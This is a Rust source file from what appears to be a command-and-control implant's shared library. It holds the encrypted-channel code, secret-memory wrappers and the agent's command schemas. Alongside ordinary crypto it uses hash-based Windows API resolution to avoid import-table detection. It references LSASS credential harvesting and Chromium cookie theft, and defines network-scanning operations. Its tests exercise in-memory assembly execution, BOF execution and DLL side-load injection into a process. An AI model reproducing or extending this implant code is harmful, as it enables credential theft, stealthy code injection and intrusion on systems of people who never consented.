/// the parameters the operator must supply.  The feature is gated behind
/// `network-discovery`; when that feature is not enabled the agent returns
/// an error at dispatch time.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum NetDiscoveryOp {
    /// Read the local ARP cache (`arp_scan`).
    ArpScan,
    /// TCP-probe a subnet for live hosts (`ping_sweep`).
    PingSweep {
        /// CIDR (e.g. `"192.168.1.0/24"`) or 3-octet prefix (`"192.168.1"`).
        subnet: String,
        /// Per-host TCP connect timeout in milliseconds.
        #[serde(default = "default_timeout_ms")]
        timeout_ms: u64,
        /// Maximum number of in-flight probes.
        #[serde(default = "default_max_concurrent")]
        max_concurrent: usize,
    },
    /// Scan a single host for open TCP ports (`tcp_port_scan`).
    TcpPortScan {
        /// Target host IP address.
        host: String,
        /// Port list to scan.
        ports: Vec<u16>,
        /// Maximum number of concurrent connection attempts.
        #[serde(default = "default_scan_concurrency")]
        concurrency: usize,
        /// Per-port TCP connect timeout in milliseconds.
        #[serde(default = "default_timeout_ms")]
        timeout_ms: u64,
    },
    /// Resolve the reverse DNS (PTR) name for an IP (`reverse_dns_lookup`).
    ReverseDns {
        /// IP address to look up.
        ip: String,
    },
    /// Enumerate Active Directory SRV records (`ad_srv_discovery`).
    AdSrvDiscovery {
        /// Domain to query (e.g. `"corp.example.com"`).
        domain: String,
    },
}

fn default_timeout_ms() -> u64 {
    3000
}
fn default_max_concurrent() -> usize {
    64
}
fn default_scan_concurrency() -> usize {
    128
}

/// Errors produced by [`CryptoSession`].
#[derive(Debug, Error)]
pub enum CryptoError {
    #[error("ciphertext is too short to contain a nonce")]
    Truncated,
    #[error("AES-GCM authentication failed")]
    AuthenticationFailed,
}

/// AES-256-GCM symmetric session keyed from a pre-shared secret.
///
/// # Forward Secrecy Upgrade Plan (Roadmap to X25519 + HKDF)
///
/// Currently, `CryptoSession` derives a static symmetric key via HKDF from a pre-shared
/// secret. This provides no forward secrecy: if the PSK is compromised, all past traffic
/// can be decrypted. We will transition to an Ephemeral Diffie-Hellman (X25519) key exchange.
///
/// ## Transition Plan & Backward Compatibility
///
/// 1. **Protocol Negotiation / Versioning:**
///    - Introduce a new handshake message or a version flag in the initial connection.
///    - Clients capable of Forward Secrecy will send an `X25519` key share in their first
///      message.
///    - Legacy clients will simply send data encrypted under the current static PSK.
///
/// 2. **Authentication via PSK:**
///    - To prevent Man-In-The-Middle (MITM) attacks during the DH exchange, the static
///      PSK will be repurposed as a MAC/signature key (or injected into the HKDF
///      extractor) to mutually authenticate the ephemeral `X25519` public keys before
///      deriving the final session keys.
///
/// 3. **HKDF Key Derivation:**
///    - The new session key will be derived as:
///      `HKDF(IKM = DH_shared_secret, salt = random_nonce, info = PSK)`
///    - This binds the X25519 ephemeral exchange to the trusted identity.
///
/// 4. **Deprecation Phases:**
///    - **Phase 1 (Dual Support):** Servers support both static AES-GCM (legacy) and
///      X25519 ephemeral (modern) to allow seamless agent upgrades.
///    - **Phase 2 (Warning):** Connections using the old static scheme log a security
///      warning and require a specific `--allow-legacy-crypto` flag.
///    - **Phase 3 (Removal):** Static PSK code paths are entirely dropped, and the PSK
///      is used exclusively for authenticating the ephemeral DH exchange.
///
/// Number of encrypt/decrypt operations after which the session key is
/// automatically re-derived from the PSK to limit the amount of ciphertext
/// an attacker can collect under a single key.
const REKEY_INTERVAL: u64 = 10_000;

// ── LockedSecret: mlock-protected, zeroizing secret wrapper ──────────────────

// P0-12: Runtime-resolved VirtualLock/VirtualUnlock to avoid static IAT entries.
#[cfg(windows)]
mod virtual_lock {
    use std::sync::OnceLock;

    type FnVirtualLock = unsafe extern "system" fn(*const u8, usize) -> i32;
    type FnVirtualUnlock = unsafe extern "system" fn(*const u8, usize) -> i32;

    static VIRTUAL_LOCK: OnceLock<Option<FnVirtualLock>> = OnceLock::new();
    static VIRTUAL_UNLOCK: OnceLock<Option<FnVirtualUnlock>> = OnceLock::new();

    fn resolve_fn<T>(name: &[u8]) -> Option<T> {
        unsafe {
            let module = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)?;
            let name_hash = pe_resolve::hash_str(name);
            let proc = pe_resolve::get_proc_address_by_hash(module, name_hash)?;
            Some(std::mem::transmute_copy(&proc))
        }
    }

    pub unsafe fn virtual_lock(ptr: *const u8, len: usize) -> i32 {
        let f = VIRTUAL_LOCK.get_or_init(|| resolve_fn(b"VirtualLock\0"));
        match f {
            Some(f) => f(ptr, len),
            None => 0,
        }
    }

    pub unsafe fn virtual_unlock(ptr: *const u8, len: usize) -> i32 {
        let f = VIRTUAL_UNLOCK.get_or_init(|| resolve_fn(b"VirtualUnlock\0"));
        match f {
            Some(f) => f(ptr, len),
            None => 0,
        }
    }
}

/// Wrapper that keeps a secret byte buffer locked in RAM (`mlock` / `VirtualLock`)
/// and zeroizes it on drop so it never ends up in swap or core dumps.
///
/// On Unix the buffer is pinned with `mlock(2)`.  On Windows we fall back to
/// `VirtualLock` when available; otherwise the zeroization still takes effect.
pub struct LockedSecret {
    data: Vec<u8>,
}

impl LockedSecret {
    /// Create a new `LockedSecret` from a byte slice, immediately locking it
    /// in physical RAM.
    pub fn new(data: &[u8]) -> Self {
        let s = Self {
            data: data.to_vec(),
        };
        s.lock_memory();
        s
    }

    /// Return a reference to the raw secret bytes.
    pub fn as_bytes(&self) -> &[u8] {
        &self.data
    }

    /// Lock the backing memory so the OS will not page it to swap.
    fn lock_memory(&self) {
        let ptr = self.data.as_ptr();
        let len = self.data.len();
        // Best-effort — failure to lock is logged but not fatal.
        #[cfg(unix)]
        unsafe {
            if libc::mlock(ptr as *const _, len) != 0 {
                log::warn!("LockedSecret: mlock({} bytes) failed", len);
            }
        }
        #[cfg(windows)]
        unsafe {
            if virtual_lock::virtual_lock(ptr, len) == 0 {
                log::warn!("LockedSecret: VirtualLock({} bytes) failed", len);
            }
        }
    }

    /// Unlock the backing memory (called from Drop).
    fn unlock_memory(&self) {
        let ptr = self.data.as_ptr();
        let len = self.data.len();
        #[cfg(unix)]
        unsafe {
            libc::munlock(ptr as *const _, len);
        }
        #[cfg(windows)]
        unsafe {
            virtual_lock::virtual_unlock(ptr, len);
        }
    }
}

impl Drop for LockedSecret {
    fn drop(&mut self) {
        // Zeroize before unlocking.
        self.data.zeroize();
        self.unlock_memory();
    }
}

/// Overwrite a byte slice with zeros using volatile writes.
///
/// Prevents the compiler from optimizing away the zeroing.
/// Shared across crates so that modules (lsass_harvest, browser_data, etc.)
/// don't each implement their own copy.
pub fn secure_zero(slice: &mut [u8]) {
    for byte in slice.iter_mut() {
        unsafe { std::ptr::write_volatile(byte, 0) };
    }
    // Full CPU fence (not compiler_fence) so the barrier is effective on
    // ARM64's weak memory model — prevents CPU reordering of the volatile
    // zeroing past this point.
    std::sync::atomic::fence(std::sync::atomic::Ordering::SeqCst);
}

/// Zeroize a `String` in place by overwriting its heap buffer with zeros.
///
/// The string is left in an unusable state (all zeros, length unchanged).
/// Intended for clearing sensitive credential values after serialization.
pub fn secure_zero_string(s: &mut String) {
    unsafe {
        let vec = s.as_mut_vec();
        secure_zero(vec);
    }
}

/// Owning wrapper that zeroizes key material on drop.
///
/// Unlike [`LockedSecret`] this does **not** lock pages in RAM (no mlock /
/// VirtualLock).  Use this for short-lived session keys where the overhead
/// of page-locking is not justified — e.g. a Chromium master key that lives
/// for the duration of a single cookie-harvest operation.
pub struct SecureKey {
    data: Vec<u8>,
}

impl SecureKey {
    /// Create a `SecureKey` by taking ownership of an existing `Vec<u8>`.
    ///
    /// The caller should discard any other copies of the key material
    /// after calling this — the value is *moved*, not copied.
    pub fn from_vec(v: Vec<u8>) -> Self {
        Self { data: v }
    }

    /// Borrow the raw key bytes.
    pub fn as_bytes(&self) -> &[u8] {
        &self.data
    }
}

impl Drop for SecureKey {
    fn drop(&mut self) {
        secure_zero(&mut self.data);
    }
}

/// RAII buffer that zeroizes its contents on drop.
///
/// Use this for any temporary buffer that holds sensitive data (credentials,
/// memory dumps, key material, etc.) to guarantee zeroization on **all**
/// exit paths — including early returns and `?` propagation — without
/// relying on manual `secure_zero()` calls at every return site.
///
/// Unlike [`SecureKey`] (fixed-length key wrapper) and [`LockedSecret`]
/// (mlock-protected), this is a general-purpose growable buffer with no
/// page-locking overhead.
pub struct SecureBuffer {
    data: Vec<u8>,
}

impl SecureBuffer {
    /// Allocate a zero-filled buffer of `size` bytes.
    pub fn new(size: usize) -> Self {
        Self {
            data: vec![0u8; size],
        }
    }

    /// Borrow the buffer contents as a mutable slice.
    pub fn as_mut_slice(&mut self) -> &mut [u8] {
        &mut self.data
    }

    /// Borrow the buffer contents as an immutable slice.
    pub fn as_slice(&self) -> &[u8] {
        &self.data
    }

    /// Return the current length of the buffer.
    pub fn len(&self) -> usize {
        self.data.len()
    }

    /// Returns `true` if the buffer is empty.
    pub fn is_empty(&self) -> bool {
        self.data.is_empty()
    }

    /// Truncate the buffer to `new_len` bytes.
    ///
    /// If `new_len` is greater than the current length, this is a no-op.
    pub fn truncate(&mut self, new_len: usize) {
        self.data.truncate(new_len);
    }

    /// Return a raw pointer to the buffer's allocation.
    pub fn as_mut_ptr(&mut self) -> *mut u8 {
        self.data.as_mut_ptr()
    }

    /// Return a raw const pointer to the buffer's allocation.
    pub fn as_ptr(&self) -> *const u8 {
        self.data.as_ptr()
    }
}

impl Drop for SecureBuffer {
    fn drop(&mut self) {
        secure_zero(&mut self.data);
    }
}

impl std::ops::Deref for SecureBuffer {
    type Target = [u8];
    fn deref(&self) -> &[u8] {
        &self.data
    }
}

impl std::ops::DerefMut for SecureBuffer {
    fn deref_mut(&mut self) -> &mut [u8] {
        &mut self.data
    }
}

pub struct CryptoSession {
    /// Cipher and key protected by a write-lock for periodic re-keying.
    inner: std::sync::RwLock<CryptoInner>,
    /// HKDF salt associated with this session.
    salt: std::sync::RwLock<[u8; SALT_LEN]>,
    /// Optional pre-shared secret used to derive per-message keys from wire salts.
    /// Wrapped in `LockedSecret` for mlock + zeroize-on-drop protection.
    ///
    /// For `from_shared_secret` sessions this holds the original PSK.
    /// For `from_key` sessions this holds the original raw key so that
    /// periodic rekeying can derive fresh keys via HKDF.
    pre_shared_secret: Option<LockedSecret>,
    /// `true` when the session was created via `from_key()`.  Determines
    /// which HKDF info constant is used during rekeying.
    from_key_mode: bool,
    /// Monotonic counter of encrypt + decrypt operations; triggers re-keying
    /// every [`REKEY_INTERVAL`] operations.
    op_counter: std::sync::atomic::AtomicU64,
}

/// Mutable inner state of a [`CryptoSession`], protected by an `RwLock`.
struct CryptoInner {
    cipher: Aes256Gcm,
    /// Copy of the raw key bytes, zeroed on drop / re-key.
    key: [u8; KEY_LEN],
    /// P2-12: Counter-based nonce — 4-byte random prefix, 8-byte monotonic counter.
    /// Guarantees nonce uniqueness without relying on per-message randomness.
    nonce_prefix: [u8; 4],
    nonce_counter: u64,
    /// P2-09: Whether the key memory has been locked via mlock/VirtualLock.
    key_locked: bool,
}

impl CryptoInner {
    /// Lock the key bytes in physical RAM (best-effort, non-fatal on failure).
    fn lock_key_memory(&mut self) {
        let ptr = self.key.as_ptr();
        let len = self.key.len();
        #[cfg(unix)]
        unsafe {
            if libc::mlock(ptr as *const _, len) != 0 {
                log::warn!("CryptoInner: mlock(key, {} bytes) failed", len);
            } else {
                self.key_locked = true;
            }
        }
        #[cfg(windows)]
        unsafe {
            if virtual_lock::virtual_lock(ptr, len) != 0 {
                self.key_locked = true;
            } else {
                log::warn!("CryptoInner: VirtualLock(key, {} bytes) failed", len);
            }
        }
        #[cfg(not(any(unix, windows)))]
        {
            let _ = (ptr, len);
        }
    }

    /// Unlock the key bytes (called during zeroize/re-key).
    fn unlock_key_memory(&mut self) {
        if !self.key_locked {
            return;
        }
        let ptr = self.key.as_ptr();
        let len = self.key.len();
        #[cfg(unix)]
        unsafe {
            libc::munlock(ptr as *const _, len);
        }
        #[cfg(windows)]
        unsafe {
            virtual_lock::virtual_unlock(ptr, len);
        }
        self.key_locked = false;
    }

    /// P2-12: Generate the next nonce as `prefix || counter.to_be_bytes()`.
    fn next_nonce(&mut self) -> [u8; NONCE_LEN] {
        let mut nonce = [0u8; NONCE_LEN];
        nonce[..4].copy_from_slice(&self.nonce_prefix);
        nonce[4..].copy_from_slice(&self.nonce_counter.to_be_bytes());
        self.nonce_counter = self.nonce_counter.wrapping_add(1);
        nonce
    }
}

impl Drop for CryptoSession {
    fn drop(&mut self) {
        // Zeroize the key inside the RwLock and unlock it.
        if let Ok(inner) = self.inner.get_mut() {
            inner.unlock_key_memory();
            inner.key.zeroize();
        }
        // `pre_shared_secret` (LockedSecret) zeroizes itself via its own Drop.
    }
}

impl CryptoSession {
    fn derive_key_bytes(pre_shared_secret: &[u8], salt: &[u8]) -> [u8; KEY_LEN] {
        let hk = hkdf::Hkdf::<Sha256>::new(Some(salt), pre_shared_secret);
        let mut key_bytes = [0u8; KEY_LEN];
        hk.expand(hkdf_info::AES_GCM, &mut key_bytes)
            .expect("HKDF-SHA256 expand must succeed");
        key_bytes
    }

    fn decrypt_nonce_prefixed(
        cipher: &Aes256Gcm,
        ciphertext: &[u8],
    ) -> Result<Vec<u8>, CryptoError> {
        if ciphertext.len() < NONCE_LEN {
            return Err(CryptoError::Truncated);
        }
        let (nonce_bytes, body) = ciphertext.split_at(NONCE_LEN);
        let nonce = Nonce::from_slice(nonce_bytes);
        cipher
            .decrypt(nonce, body)
            .map_err(|_| CryptoError::AuthenticationFailed)
    }

    /// Build a session from a pre-shared secret using HKDF-SHA256 and a random
    /// per-session salt.
    pub fn from_shared_secret(pre_shared_secret: &[u8]) -> Self {
        let mut salt = [0u8; SALT_LEN];
        rand::thread_rng().fill_bytes(&mut salt);
        Self::from_shared_secret_with_salt(pre_shared_secret, &salt)
    }

    /// Build a session from a pre-shared secret and an explicit HKDF salt.
    pub fn from_shared_secret_with_salt(pre_shared_secret: &[u8], salt: &[u8]) -> Self {
        let key_bytes = Self::derive_key_bytes(pre_shared_secret, salt);
        let key = Key::<Aes256Gcm>::from_slice(&key_bytes);

        let mut salt_bytes = [0u8; SALT_LEN];
        let copy_len = salt.len().min(SALT_LEN);
        salt_bytes[..copy_len].copy_from_slice(&salt[..copy_len]);

        // P2-12: Generate a random 4-byte nonce prefix for counter-based nonces.
        let mut nonce_prefix = [0u8; 4];
        rand::thread_rng().fill_bytes(&mut nonce_prefix);

        let mut inner = CryptoInner {
            cipher: Aes256Gcm::new(key),
            key: key_bytes,
            nonce_prefix,
            nonce_counter: 0,
            key_locked: false,
        };
        // P2-09: Lock the key memory.
        inner.lock_key_memory();

        Self {
            inner: std::sync::RwLock::new(inner),
            salt: std::sync::RwLock::new(salt_bytes),
            pre_shared_secret: Some(LockedSecret::new(pre_shared_secret)),
            from_key_mode: false,
            op_counter: std::sync::atomic::AtomicU64::new(0),
        }
    }

    /// Build a session directly from a 32-byte key.
    ///
    /// The key is stored in a `LockedSecret` so that periodic rekeying can
    /// derive fresh keys via HKDF using the [`hkdf_info::FROM_KEY_REKEY`]
    /// domain-separation constant.
    pub fn from_key(mut key_bytes: [u8; KEY_LEN]) -> Self {
        let key = Key::<Aes256Gcm>::from_slice(&key_bytes);
        let mut salt = [0u8; SALT_LEN];
        rand::thread_rng().fill_bytes(&mut salt);
        // P2-12: Generate a random 4-byte nonce prefix.
        let mut nonce_prefix = [0u8; 4];
        rand::thread_rng().fill_bytes(&mut nonce_prefix);

        // Store a copy in LockedSecret so periodic rekeying can derive fresh
        // keys via HKDF.
        let stored_key = LockedSecret::new(&key_bytes);

        let mut inner = CryptoInner {
            cipher: Aes256Gcm::new(key),
            key: key_bytes,
            nonce_prefix,
            nonce_counter: 0,
            key_locked: false,
        };
        // P2-09: Lock the key memory.
        inner.lock_key_memory();

        // MED-016: Zeroize the caller's copy of the key now that we have
        // absorbed it into LockedSecret + CryptoInner.  Defense in depth —
        // the stack copy would otherwise linger until the frame is reused.
        key_bytes.zeroize();

        Self {
            inner: std::sync::RwLock::new(inner),
            salt: std::sync::RwLock::new(salt),
            pre_shared_secret: Some(stored_key),
            from_key_mode: true,
            op_counter: std::sync::atomic::AtomicU64::new(0),
        }
    }

    /// Check the operation counter and re-derive the session key if the
    /// [`REKEY_INTERVAL`] has been reached.  Called while the caller already
    /// holds the write lock on `inner`, so the rekey + subsequent encrypt or
    /// decrypt happen atomically with no TOCTOU race.
    ///
    /// `should_rekey` is computed from the `op_counter` before acquiring the
    /// lock and passed in so that the atomic fetch_add is not duplicated.
    fn rekey_locked(&self, inner: &mut CryptoInner) {
        let psk = match self.pre_shared_secret.as_ref() {
            Some(p) => p,
            None => return, // should not happen — both paths now store a PSK
        };

        let mut new_salt = [0u8; SALT_LEN];
        rand::thread_rng().fill_bytes(&mut new_salt);

        let new_key_bytes = if self.from_key_mode {
            // from_key() sessions rekey via HKDF with a dedicated info
            // constant for domain separation from the PSK path.
            let hk = hkdf::Hkdf::<Sha256>::new(Some(&new_salt), psk.as_bytes());
            let mut out = [0u8; KEY_LEN];
            hk.expand(hkdf_info::FROM_KEY_REKEY, &mut out)
                .expect("HKDF-SHA256 expand must succeed");
            out
        } else {
            Self::derive_key_bytes(psk.as_bytes(), &new_salt)
        };
        let new_key = Key::<Aes256Gcm>::from_slice(&new_key_bytes);

        inner.unlock_key_memory();
        inner.key.zeroize();
        inner.key = new_key_bytes;
        inner.cipher = Aes256Gcm::new(new_key);
        // P2-12: Reset nonce counter on re-key to avoid wrapping.
        let mut new_prefix = [0u8; 4];
        rand::thread_rng().fill_bytes(&mut new_prefix);
        inner.nonce_prefix = new_prefix;
        inner.nonce_counter = 0;
        inner.lock_key_memory();

        // Update salt while still holding exclusive access to the session.
        // We must drop the inner write guard temporarily to acquire the salt
        // write lock — but this is safe because no other thread can observe
        // a partially-rekeyed state: the op_counter already advanced past the
        // threshold, so no other thread will attempt rekey_locked().
        //
        // SAFETY: We hold the only reference that matters (inner write lock).
        // Salt is only read during encrypt/decrypt which also hold inner.
        *self.salt.write().unwrap() = new_salt;
    }

    /// Return a copy of the raw 32-byte AES-256-GCM key.
    ///
    /// Intended for registering the key with the memory-guard subsystem so it
    /// is encrypted while the agent is idle.  Prefer calling
    /// `memory_guard::register_session_key` rather than reading these bytes
    /// directly.
    pub fn key_bytes(&self) -> [u8; KEY_LEN] {
        self.inner.read().unwrap().key
    }

    /// Encrypt `plaintext` and return `salt || nonce || ciphertext_with_tag`.
    ///
    /// P2-12: Uses counter-based nonces (4-byte random prefix + 8-byte counter)
    /// instead of random nonces, providing stronger uniqueness guarantees.
    ///
    /// The rekey check and the encryption are performed under the same write
    /// lock to prevent a TOCTOU race where another thread could rekey between
    /// the check and the encrypt, causing key/salt nonce-counter mismatches.
    pub fn encrypt(&self, plaintext: &[u8]) -> Vec<u8> {
        use std::sync::atomic::Ordering;

        // Bump the counter first (outside the lock) to decide whether rekey
        // is needed.  AcqRel ensures visibility across threads.
        let prev = self.op_counter.fetch_add(1, Ordering::AcqRel);
        let should_rekey = prev > 0 && prev.is_multiple_of(REKEY_INTERVAL);

        // Hold the write lock for the entire rekey + encrypt sequence.
        let mut inner = self.inner.write().unwrap();
        if should_rekey {
            self.rekey_locked(&mut inner);
        }

        let salt = self.salt.read().unwrap();
        let nonce_bytes = inner.next_nonce();
        let nonce = Nonce::from_slice(&nonce_bytes);
        let ciphertext = inner
            .cipher
            .encrypt(nonce, plaintext)
            .expect("AES-GCM encryption is infallible for valid inputs");

        let mut out = Vec::with_capacity(SALT_LEN + NONCE_LEN + ciphertext.len());
        out.extend_from_slice(&*salt);
        out.extend_from_slice(&nonce_bytes);
        out.extend_from_slice(&ciphertext);
        out
    }

    /// Decrypt a nonce-prefixed buffer (`nonce || ciphertext_with_tag`).
    ///
    /// This method assumes `self` was already built with the correct key/salt
    /// context. Callers receiving full wire-format payloads prefixed with salt
    /// SHOULD use [`Self::decrypt_with_psk`].
    ///
    /// The rekey check and the decryption are performed atomically to prevent
    /// TOCTOU races on the key/salt/nonce state.
    pub fn decrypt(&self, ciphertext: &[u8]) -> Result<Vec<u8>, CryptoError> {
        use std::sync::atomic::Ordering;

        // Bump the counter first (outside the lock) to decide whether rekey
        // is needed.  AcqRel ensures visibility across threads.
        let prev = self.op_counter.fetch_add(1, Ordering::AcqRel);
        let should_rekey = prev > 0 && prev.is_multiple_of(REKEY_INTERVAL);

        // Hold the write lock for the entire rekey + decrypt sequence.
        // Even though decrypt only needs read access to the cipher in the
        // common case, we need the write lock to cover the potential rekey.
        let mut inner = self.inner.write().unwrap();
        if should_rekey {
            self.rekey_locked(&mut inner);
        }

        // New format: salt || nonce || ciphertext_with_tag.
        // Try this path first for backward compatibility with existing callers
        // that pass encrypt() output directly to decrypt().
        if ciphertext.len() >= SALT_LEN + NONCE_LEN {
            let (salt, rest) = ciphertext.split_at(SALT_LEN);

            // CRIT-001 fix: from_key() sessions store the raw key directly
            // and encrypt with it — they do NOT use HKDF(salt, key) during
            // encryption.  For these sessions, skip the salt-based HKDF
            // re-derivation and decrypt directly with inner.cipher.
            // For from_shared_secret() sessions, re-derive the key from
            // PSK + embedded salt so independently-created sessions sharing
            // the same PSK can still interoperate.
            if self.from_key_mode {
                // from_key sessions: salt is purely cosmetic in the wire
                // format.  Decrypt directly with the session's stored cipher.
                if let Ok(plain) = Self::decrypt_nonce_prefixed(&inner.cipher, rest) {
                    return Ok(plain);
                }
            } else if let Some(psk) = self.pre_shared_secret.as_ref() {
                // from_shared_secret sessions: re-derive key from PSK + salt.
                let key_bytes = Self::derive_key_bytes(psk.as_bytes(), salt);
                let key = Key::<Aes256Gcm>::from_slice(&key_bytes);
                let cipher = Aes256Gcm::new(key);
                if let Ok(plain) = Self::decrypt_nonce_prefixed(&cipher, rest) {
                    return Ok(plain);
                }
            }
        }

        // Legacy format: nonce || ciphertext_with_tag.
        Self::decrypt_nonce_prefixed(&inner.cipher, ciphertext)
    }

    /// Decrypt a full wire-format message produced by [`Self::encrypt`]:
    /// `salt || nonce || ciphertext_with_tag`.
    pub fn decrypt_with_psk(psk: &[u8], wire_data: &[u8]) -> Result<Vec<u8>, CryptoError> {
        if wire_data.len() < SALT_LEN + NONCE_LEN {
            return Err(CryptoError::Truncated);
        }
        let (salt, rest) = wire_data.split_at(SALT_LEN);
        let session = Self::from_shared_secret_with_salt(psk, salt);
        session.decrypt(rest)
    }
}

pub mod transport;

/// Async transport abstraction over which framed [`Message`]s are exchanged.
///
/// Concrete implementations (TCP+TLS, QUIC, in-memory test harness) live in
/// downstream crates.
#[async_trait::async_trait]
pub trait Transport: Send {
    async fn send(&mut self, msg: Message) -> anyhow::Result<()>;
    async fn recv(&mut self) -> anyhow::Result<Message>;
}

/// Blanket impl so that `Box<dyn Transport + Send>` can itself be used as a `Transport`.
#[async_trait::async_trait]
impl<T: Transport + ?Sized + Send> Transport for Box<T> {
    async fn send(&mut self, msg: Message) -> anyhow::Result<()> {
        (**self).send(msg).await
    }
    async fn recv(&mut self) -> anyhow::Result<Message> {
        (**self).recv().await
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn encrypt_decrypt_roundtrip() {
        let psk = b"test-dev-secret";
        let session = CryptoSession::from_shared_secret(psk);
        let plaintext = b"hello world";
        let ct = session.encrypt(plaintext);
        assert!(ct.len() > SALT_LEN + NONCE_LEN);
        let pt = CryptoSession::decrypt_with_psk(psk, &ct).expect("decrypt");
        assert_eq!(pt, plaintext);
    }

    #[test]
    fn nonces_are_unique_per_encryption() {
        let a = CryptoSession::from_shared_secret(b"k").encrypt(b"same");
        let b = CryptoSession::from_shared_secret(b"k").encrypt(b"same");
        assert_ne!(a[..SALT_LEN], b[..SALT_LEN]);
        assert_ne!(
            a[SALT_LEN..SALT_LEN + NONCE_LEN],
            b[SALT_LEN..SALT_LEN + NONCE_LEN]
        );
        assert_ne!(a, b);
    }

    #[test]
    fn tampered_ciphertext_is_rejected() {
        let psk = b"k";
        let session = CryptoSession::from_shared_secret(psk);
        let mut ct = session.encrypt(b"payload");
        let mut idx = SALT_LEN + NONCE_LEN;
        if idx >= ct.len() {
            idx = ct.len() - 1;
        }
        ct[idx] ^= 0x01;
        let err = CryptoSession::decrypt_with_psk(psk, &ct).unwrap_err();
        assert!(matches!(err, CryptoError::AuthenticationFailed));
    }

    #[test]
    fn truncated_ciphertext_is_rejected() {
        let session = CryptoSession::from_shared_secret(b"k");
        let err = session.decrypt(&[0u8; NONCE_LEN - 1]).unwrap_err();
        assert!(matches!(err, CryptoError::Truncated));
    }

    #[test]
    fn message_serialization_roundtrip() {
        let msg = Message::TaskRequest {
            task_id: "t-1".into(),
            command: Command::RunApprovedScript {
                script: "rotate-logs".into(),
            },
            operator_id: None,
        };
        let bytes = bincode::serde::encode_to_vec(&msg, bincode::config::legacy()).unwrap();
        let back: Message = bincode::serde::decode_from_slice(&bytes, bincode::config::legacy())
            .map(|(v, _)| v)
            .unwrap();
        match back {
            Message::TaskRequest {
                task_id, command, ..
            } => {
                assert_eq!(task_id, "t-1");
                assert!(matches!(
                    command,
                    Command::RunApprovedScript { script } if script == "rotate-logs"
                ));
            }
            _ => panic!("unexpected variant"),
        }
    }

    #[test]
    fn dashboard_execute_payload_json_matches_command_schema() {
        let assembly: Command = serde_json::from_value(serde_json::json!({
            "ExecuteAssembly": {
                "data": [77, 90, 144, 0],
                "args": ["--mode", "audit"],
                "timeout_secs": 45
            }
        }))
        .unwrap();
        assert!(matches!(
            assembly,
            Command::ExecuteAssembly { data, args, timeout_secs }
                if data == vec![0x4d, 0x5a, 0x90, 0x00]
                    && args == vec!["--mode", "audit"]
                    && timeout_secs == Some(45)
        ));

        let bof: Command = serde_json::from_value(serde_json::json!({
            "ExecuteBOF": {
                "data": [222, 173, 190, 239],
                "args": ["arg1", "arg2"],
                "timeout_secs": 60
            }
        }))
        .unwrap();
        assert!(matches!(
            bof,
            Command::ExecuteBOF { data, args, timeout_secs }
                if data == vec![0xde, 0xad, 0xbe, 0xef]
                    && args == vec!["arg1", "arg2"]
                    && timeout_secs == Some(60)
        ));
    }

    #[test]
    fn dashboard_side_load_json_matches_export_config_schema() {
        let command: Command = serde_json::from_value(serde_json::json!({
            "InjectSideLoad": {
                "pid": 4242,
                "payload": [170, 187, 204, 221],
                "export_config": {
                    "forward_target": "version.dll",
                    "named_exports": ["GetFileVersionInfoA", "VerQueryValueW"],
                    "ordinal_exports": [[1, "DllRegisterServer"], [2, "DllUnregisterServer"]]
                }
            }
        }))
        .unwrap();

        assert!(matches!(
            command,
            Command::InjectSideLoad { pid, payload, export_config }
                if pid == 4242
                    && payload == vec![0xaa, 0xbb, 0xcc, 0xdd]
                    && export_config.forward_target == "version.dll"
                    && export_config.named_exports == vec!["GetFileVersionInfoA", "VerQueryValueW"]
                    && export_config.ordinal_exports == vec![
                        (1, "DllRegisterServer".to_string()),
                        (2, "DllUnregisterServer".to_string())
                    ]
        ));
    }
}
